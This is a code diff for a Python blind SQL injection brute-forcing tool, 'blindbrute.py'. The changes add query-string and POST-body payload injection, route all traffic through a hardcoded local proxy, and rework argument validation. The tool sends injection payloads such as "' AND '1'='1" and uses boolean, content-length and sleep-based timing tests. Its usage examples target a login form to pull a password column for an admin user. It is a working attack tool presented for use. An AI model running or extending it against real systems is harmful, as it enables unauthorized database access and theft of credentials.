@@ -3,15 +3,13 @@ import sys
 import time
 import json
 import string
-import select
 import requests
 import argparse
-import platform
 import threading
 import statistics
 from copy import deepcopy
-from urllib.parse import quote
 from gramification import gramify
+from urllib.parse import quote, parse_qs
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
@@ -34,10 +32,11 @@ def usage():
     Optional Arguments:
         -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
         -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
-        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
+        -d, --data                   Specify data to be sent in the request body. Changes request type to POST. INJECT placeholder will be replaced with the payload.
         -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
         -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
         -o, --output-file            Specify a file to output the extracted data
+        -qs, --query-string          Query string to append to the URL for GET requests. INJECT placeholder will be replaced with the payload.
         -ba, --binary-attack         Use binary search for ASCII extraction. HIGHLY recommended if character case matters.
         -da, --dictionary-attack     Path to a wordlist for dictionary-based extraction
         -db, --database              Specify the database type (e.g., MySQL, PostgreSQL)
@@ -53,7 +52,7 @@ def usage():
     
 
     Examples:
-        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
+        blindbrute.py -u "http://example.com/login" -d "username=sam&password=samspasswordINJECT" -t users -c password -w "username='admin'"
         blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
         blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
         blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
@@ -103,18 +102,12 @@ def load_queries():
 
 
 def max_workers(args):
-    try:
-        num_cpus = os.cpu_count()
-        level = args.level
-        workers = num_cpus * level
-        return workers
+    num_cpus = os.cpu_count()
+    level = args.level or 1
+    workers = num_cpus * level
+    return workers
 
-    except Exception as e:
-        print(f"[-] Error determining max workers: {e}. Defaulting to 8.")
-        return 8
-
-
-### Objects
+### Info Objects
 
 
 class RequestInfo:
@@ -192,7 +185,7 @@ def is_injectable(request_info, constants, args):
         )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
-        return False, None, None, None, constants
+        return False, None, None, None, constants, args
 
     payloads = {
         "true": "' AND '1'='1",
@@ -225,7 +218,7 @@ def is_injectable(request_info, constants, args):
             )
 
             if response is None:
-                return False, None, None, None, constants
+                return False, None, None, None, constants, args
 
             responses[condition]["status_code"] = response.status_code
             responses[condition]["content-length"] = len(response.text)
@@ -240,7 +233,7 @@ def is_injectable(request_info, constants, args):
 
         except requests.exceptions.RequestException as e:
             print(f"[-] Error during {condition} condition injection request: {e}")
-            return False, None, None, None, constants
+            return False, None, None, None, constants, args
 
     true_status_code = responses["true"]["status_code"]
     false_status_code = responses["false"]["status_code"]
@@ -270,7 +263,7 @@ def is_injectable(request_info, constants, args):
     else:
         if not args.sleep_only:
             print("[-] Malformed request, look over your input.")
-        return False, None, None, None, constants
+        return False, None, None, None, constants, args
 
     # Step 4: Content length check
     if (
@@ -356,7 +349,7 @@ def is_injectable(request_info, constants, args):
     if baseline_condition != "true":
         print("[!] Baseline condition does not evaluate to true. Check the information you supplied. "
               "Make sure the database is receiving a known value.")
-        return False, None, None, None, constants
+        return False, None, None, None, constants, args
 
     best_method = max(scores, key=scores.get)
     if scores[best_method] > 0:
@@ -368,9 +361,9 @@ def is_injectable(request_info, constants, args):
             return conditions, baseline_condition
         if args.sleep_only:
             method = "sleep"
-            return True, baseline_condition, method, conditions, constants
+            return True, baseline_condition, method, conditions, constants, args
         else:
-            return True, baseline_condition, method, conditions, constants
+            return True, baseline_condition, method, conditions, constants, args
     else:
         print("[*] Fastest methods failed. Attempting sleep-based detection.")
         args.sleep_only = 10
@@ -395,7 +388,7 @@ def is_injectable(request_info, constants, args):
                 )
 
                 if response is None:
-                    return False, None, None, None, constants
+                    return False, None, None, None, constants, args
 
                 if response_time > args.sleep_only:
                     constants.sleep_queries["sleep_queries"] = [sleep_query.replace(str(args.sleep_only), '%')]
@@ -404,15 +397,15 @@ def is_injectable(request_info, constants, args):
 
             except requests.exceptions.RequestException as e:
                 print(f"[-] Error during sleep injection request: {e}")
-                return False, None, None, None, constants
+                return False, None, None, None, constants, args
 
         if len(constants.sleep_queries["sleep_queries"]) == 1:
             print(f"[+] Sleep query found: {constants.sleep_queries["sleep_queries"]}. Using sleep-based detection.")
             method = "sleep"
-            return True, baseline_condition, method, conditions, constants
+            return True, baseline_condition, method, conditions, constants, args
 
     print("[-] No significant differences detected between conditions. Field is likely not injectable.")
-    return False, None, None, None, constants
+    return False, None, None, None, constants, args
 
 
 def column_count(request_info, db_info, constants, args):
@@ -741,8 +734,8 @@ def discover_length(request_info, db_info, args):
 
 def extract_data(request_info, db_info, constants, args):
     """
-    extracts data in a variety of ways. the default behavior is a threaded charcter-by-character
-    approach with a standard set of letter frequencies and ngrams.if that doesnt tickle your fancy,
+    extracts data in a variety of ways. the default behavior is a threaded character-by-character
+    approach with a standard set of letter frequencies and ngrams. if that doesnt tickle your fancy,
     you can provide a dictionary, use a binary search algorithm, or provide a more tailored piece
     of sample text for custom ngrams. the world is your oyster.
     """
@@ -969,6 +962,7 @@ class InputThread(threading.Thread):
     def run(self):
         self.input_value = sys.stdin.readline()
 
+
 def input_with_timeout(timeout):
     input_thread = InputThread()
     input_thread.daemon = True
@@ -978,6 +972,7 @@ def input_with_timeout(timeout):
         return None
     else:
         return input_thread.input_value.strip().lower()
+
 
 def no_length():
     print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
@@ -991,6 +986,7 @@ def no_length():
         print("\n[*] No input received. Proceeding with extraction anyway.")
         return True
 
+
 def one_third():
     print(
         "\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
@@ -1003,6 +999,7 @@ def one_third():
     else:
         print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
         return True
+
 
 def spent():
     print(
@@ -1181,12 +1178,14 @@ def baseline_request(request_info, args):
 
 def inject(payload, request_info, args):
     """
-    sends the requests if a request template is not provided. locked to GET and POST if you
-    don't provide a request template. this is where the actual injection happens.
-    an encoded payload is attached to whatever field is desired. if a request template
+    Sends the requests if a request template is not provided. Locked to GET and POST if you
+    don't provide a request template. This is where the actual injection happens.
+    A payload is attached to whatever field is desired. If a request template
     is provided, this function overwrites the INJECT placeholder and hands the request to
-    send_request. all functions that involve sql injection rely on this function.
+    send_request. All functions that involve SQL injection rely on this function.
     """
+
+    url = args.url
 
     try:
         start_time = time.time()
@@ -1204,10 +1203,32 @@ def inject(payload, request_info, args):
             headers = {**request_info.static_headers}
             for key, value in request_info.injectable_headers.items():
                 headers[key] = value + payload.encoded
-            if args.data:
-                response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
+            if args.query_string:
+                query_params = parse_qs(args.query_string, keep_blank_values=True)
+                for key in query_params:
+                    values = query_params[key]
+                    new_values = []
+                    for value in values:
+                        if 'INJECT' in value:
+                            new_value = value.replace('INJECT', payload.payload)
+                        else:
+                            new_value = value
+                        new_values.append(new_value)
+                    query_params[key] = new_values
+                params = {key: value[0] if len(value) == 1 else value for key, value in query_params.items()}
             else:
-                response = requests.get(url=args.url, headers=headers, timeout=args.timeout)
+                params = None
+
+            proxies = {
+                'http': 'http://localhost:8080',
+                'https': 'http://localhost:8080',
+            }
+
+            if args.data:
+                data = args.data.replace("INJECT", payload.encoded)
+                response = requests.post(url=url, headers=headers, data=data, timeout=args.timeout, proxies=proxies)
+            else:
+                response = requests.get(url=url, headers=headers, params=params, timeout=args.timeout, proxies=proxies)
 
         end_time = time.time()
         response_time = end_time - start_time
@@ -1470,14 +1491,10 @@ def arg_parse():
     """
     initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
     """
-
+    errors = []
     parser = argparse.ArgumentParser(description="Blind SQL Injection Brute Forcer")
 
     parser.add_argument('-u', '--url', required=True, help="Target URL")
-    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'),
-                        help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
-    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'),
-                        help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
     parser.add_argument('-d', '--data', required=False,
                         help="Specify data to be sent in the request body. Changes request type to POST.")
     parser.add_argument('-f', '--file', required=False,
@@ -1488,13 +1505,23 @@ def arg_parse():
     parser.add_argument('-m', '--max-length', type=int, default=1000,
                         help="Maximum length of the extracted data that the script will check for (default: 1000)")
     parser.add_argument('-o', '--output-file', required=False, help="Specify a file to output the extracted data")
+    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'),
+                        help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
+    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'),
+                        help="Static headers as key-value pairs that do not contain payloads "
+                             "(e.g., -sh session_id abcdefg12345abababab123456789012)")
+    parser.add_argument('-qs', '--query-string', required=False,
+                        help="Query string to append to the URL for GET requests. INJECT placeholder will be replaced with the payload. "
+                             "(e.g., 'id=1&name=johnINJECT')")
     parser.add_argument('-ba', '--binary-attack', action='store_true',
                         help="Use binary search for ASCII extraction. HIGHLY recommended if character case matters.")
     parser.add_argument('-da', '--dictionary-attack', required=False,
-                        help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
+                        help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when "
+                             "2/3's of the data extraction is complete unless user specifies otherwise.")
     parser.add_argument('-db', '--database', type=str, help="Specify the database type (e.g., MySQL, PostgreSQL)")
     parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2,
-                        help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
+                        help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. "
+                             "Number workers is calculated as (CPU cores * level). Default is 2.")
     parser.add_argument('--delay', type=float, default=0,
                         help="Delay in seconds between requests to bypass rate limiting")
     parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'],
@@ -1505,7 +1532,8 @@ def arg_parse():
     parser.add_argument('--keywords', type=str,
                         help="Comma-separated list of keywords for detection (e.g., 'Welcome,Success,Error,Invalid')")
     parser.add_argument('--sleep-only', type=int,
-                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
+                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. "
+                             "Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
     parser.add_argument('--gramify', type=str, help="Generate n-grams and probabilities from the provided file path")
     parser.add_argument('--top-n', type=int,
                         help="Number of top results to display and save for n-grams. Less is often more here.")
@@ -1519,58 +1547,53 @@ def arg_parse():
     if args.keywords:
         args.keywords = [kw.strip() for kw in args.keywords.split(',')]
     if not args.url:
-        print("[!] You must provide a URL (-u).")
-        return
-    if args.url and not args.file and not (args.injectable_headers or args.data):
-        print(
-            "[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
-        return
+        errors.append("[!] You must provide a URL (-u).")
+    if args.url and not args.file and not (args.injectable_headers or args.data or args.query_string):
+        errors.append("[!] You must provide either injectable headers (-ih), data (-d), or a query string (-qs) when specifying a URL without a request file (-f).")
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
-        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
-        return
+        errors.append("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
     if args.data and args.file:
-        print("[!] You cannot specify data for the request file outside of the request file.")
-        return
+        errors.append("[!] You cannot specify data for the request file outside of the request file.")
     if (args.injectable_headers or args.static_headers) and args.file:
-        print("[!] You cannot specify headers for the request file outside of the request file.")
-        return
+        errors.append("[!] You cannot specify headers for the request file outside of the request file.")
     if args.sleep_only and args.sleep_only < 1:
-        print(
-            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
-        return
+        errors.append("[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
+    if args.query_string and args.file:
+        errors.append("[!] You cannot specify a query string (-qs) for the request file outside of the request file.")
+    if args.data and args.query_string:
+        errors.append("[!] You cannot specify both data (-d) and a query string (-qs). Choose one.")
+    if args.data and "INJECT" not in args.data:
+        errors.append("[!] You must provide an INJECT placeholder for the payload. Example: -d 'username=sam&password=samspasswordINJECT'")
+    if args.query_string and "INJECT" not in args.query_string:
+        errors.append("[!] You must provide an INJECT placeholder for the payload. Example: -qs 'id=1INJECT&Submit=Submit'")
     if args.timeout < 3:
-        print(
-            "[!] Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. The recommended timeout is 10. Reconsider.")
-        return
+        errors.append("[!] Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. "
+              "The recommended timeout is 10. Reconsider.")
     if args.top_n and not args.gramify:
-        print(
-            "[!] You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
-        return
+        errors.append("[!] You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
     if args.file and not os.path.exists(args.file):
-        print(f"[!] The provided request file path {args.file} does not exist or cannot be accessed.")
-        return
+        errors.append(f"[!] The provided request file path {args.file} does not exist or cannot be accessed.")
     if args.gramify and not os.path.exists(args.gramify):
-        print(f"[!] The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
-        return
+        errors.append(f"[!] The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
     if args.dictionary_attack and not os.path.exists(args.dictionary_attack):
-        print(f"[!] The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
-        return
+        errors.append(f"[!] The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
     if args.binary_attack and args.dictionary_attack:
-        print("[!] Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
-        return
+        errors.append("[!] Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
     if args.force == 'keyword' and not args.keywords:
-        print("[!] You must provide --true-keywords or --false-keywords when forcing keyword-based detection.")
-        return
+        errors.append("[!] You must provide keywords (--keywords) when forcing a keyword detection.")
     if args.database and not args.force:
-        print("[!] You must force a detection method when specifying a database. Example: --db mariadb --force sleep")
-        return
+        errors.append("[!] You must force a detection method when specifying a database. Example: --db mariadb --force sleep")
     if args.dictionary_attack and args.gramify:
-        print(
-            "[*] Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
+        print("[*] Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
     if args.sleep_only:
         args.timeout += args.sleep_only
 
-    return args
+    if errors:
+        for error in errors:
+            print(error)
+            return
+    else:
+        return args
 
 
 ### MAIN
@@ -1644,11 +1667,7 @@ def main():
 
     if args.force:
         if args.force == "keyword":
-            if args.keywords:
-                db_info.method = "keyword"
-            else:
-                print("[!] You must provide keywords to force a keyword detection.")
-                return
+            db_info.method = "keyword"
         elif args.force == "sleep":
             args.sleep_only = 10
             args.timeout += args.sleep_only
@@ -1662,7 +1681,7 @@ def main():
         print(f"[+] Skipping method discovery. Using forced detection method: {db_info.method}")
     else:
         # Step 1: Check if the field is injectable
-        db_info.injectable, db_info.baseline_condition, db_info.method, db_info.conditions, constants = (
+        db_info.injectable, db_info.baseline_condition, db_info.method, db_info.conditions, constants, args = (
             is_injectable(request_info=request_info, constants=constants, args=args))
 
         if not db_info.injectable:
@@ -1673,9 +1692,6 @@ def main():
 
     if db_info.method == "content":
         db_info.threshold_type, db_info.avg_variance = threshold_type(request_info=request_info, args=args, constants=constants)
-
-    # Step 2: Count columns
-    db_info.columns = column_count(request_info=request_info, db_info=db_info, constants=constants, args=args)
 
     if args.database:
         db_provided = args.database
@@ -1702,6 +1718,8 @@ def main():
             print(f"[-] Database '{db_name}' not found in the queries file. Exiting.")
             return
     else:
+        # Step 2: Count columns
+        db_info.columns = column_count(request_info=request_info, db_info=db_info, constants=constants, args=args)
         # Step 3: Detect the database type
         db_info, args = (detect_database(request_info=request_info, db_info=db_info, constants=constants, args=args))
 
